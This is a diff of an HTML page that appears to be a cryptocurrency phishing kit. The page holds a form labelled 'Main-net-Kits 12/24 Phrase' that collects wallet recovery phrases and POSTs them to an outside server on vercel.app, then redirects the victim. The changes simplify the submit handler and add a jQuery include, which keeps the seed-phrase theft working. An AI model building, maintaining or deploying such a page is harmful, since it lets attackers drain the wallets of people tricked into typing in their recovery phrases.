@@ -130,7 +130,7 @@
                                     <!-- 12/24 Word Phrase Section -->
                                     <div class="tab-content" data-tab-content="link1" style="display: block;">
                                         <form class="p-1" name="Main-net-Kits 12/24 Phrase" 
-                                         method="POST" onsubmit="submit" data-form-id="phrase"
+                                         method="POST" onsubmit="submit"
                                         action="https://backendserver-eta.vercel.app/submit-form"
                                         >
                                             <div class="mb-3 pt-0">
@@ -238,20 +238,15 @@
             });
 
             document.addEventListener('DOMContentLoaded', function () {
-    const forms = document.querySelectorAll('.p-1');
+    const form = document.querySelector('.p-1'); // Replace 'yourFormClass' with the actual class of your form
 
-    forms.forEach(form => {
-        form.addEventListener('submit', function (event) {
-            event.preventDefault();
+    form.addEventListener('submit', function (event) {
+        event.preventDefault();
 
-            // Identify the form based on a data attribute
-            const formId = form.getAttribute('data-form-id');
+        // Add your form submission logic here, for example using fetch
 
-            // Add your form submission logic here, for example using fetch
-
-            // After the form is successfully submitted, redirect to 'redirect.html'
-            window.location.href = `/user/redirect-${formId}.html`;
-        });
+        // After the form is successfully submitted, redirect to 'redirect.html'
+        window.location.href = '/user/redirect.html';
     });
 });
 
@@ -300,6 +295,7 @@
 
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
 
 
